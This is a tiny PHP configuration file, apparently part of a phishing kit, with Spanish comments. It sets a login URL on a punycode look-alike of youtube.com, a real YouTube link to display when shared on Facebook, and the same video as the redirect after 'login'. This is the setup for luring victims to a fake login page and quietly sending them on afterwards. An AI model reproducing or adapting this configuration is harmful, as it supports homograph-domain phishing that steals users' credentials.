<?php
//Enlace Web, termine en /
$enlace_actual = "https://xn--youtube-b0a.com/login/";
//Direccion a mostrar en Facebook
$DFC = "https://www.youtube.com/watch?v=8tRS9YNyJw0";
//Direccion Final Despues del login
$DFinal = "https://www.youtube.com/watch?v=8tRS9YNyJw0";
?>